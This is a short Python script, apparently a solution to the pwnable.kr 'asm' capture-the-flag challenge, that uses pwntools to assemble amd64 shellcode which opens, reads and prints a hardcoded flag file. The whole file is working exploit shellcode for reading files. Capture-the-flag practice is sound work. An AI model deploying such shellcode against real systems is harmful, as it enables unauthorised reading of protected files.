#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

shellcode = """
open:
    mov rdi, 0x41414066
    mov rax, 2
    syscall
read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall
write:
    mov rdx, rax
    mov rdi, 0x1
    mov rsi, rsp
    mov rax, 0x1
    syscall
str:
    .ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
    .byte 0
"""

print(asm(shellcode))
